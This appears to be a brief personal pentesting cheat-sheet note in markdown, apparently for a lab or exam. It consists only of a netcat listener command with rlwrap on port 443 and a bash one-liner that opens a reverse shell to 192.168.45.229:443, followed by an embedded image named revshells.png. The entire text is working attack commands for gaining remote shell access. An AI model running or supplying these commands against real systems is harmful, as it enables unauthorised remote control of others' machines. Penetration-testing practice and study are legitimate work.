

sudo rlwrap -cAr nc -lvnp 443

/bin/bash -i >& /dev/tcp/192.168.45.229/443 0>&1

![[revshells.png|500]]